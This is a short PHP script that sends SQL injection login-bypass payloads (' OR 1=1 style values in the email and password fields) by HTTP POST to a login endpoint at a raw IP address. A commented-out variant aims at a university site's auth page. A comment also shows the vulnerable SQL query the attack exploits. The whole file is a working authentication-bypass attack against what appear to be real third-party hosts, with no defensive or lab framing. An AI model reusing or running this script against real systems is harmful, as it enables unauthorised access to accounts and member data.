<?


//$url = 'http://www.cjcu.edu.tw/cpa/news/auth.php';
//$data = array('userid' => "1'OR '1'='1" , 'passwd' => "1' OR '1'='1");


$url = 'http://210.70.168.17/in.php';


//$sqlS = "select * from member where mail ='$email' and password ='$psd'";


$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' =>  http_build_query(array('in_mail' => " 1'  OR  1=1  '", 'in_psd' => " 1'  OR  1=1  '")) ,
    ),

);


$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);


 var_dump($result);

?>

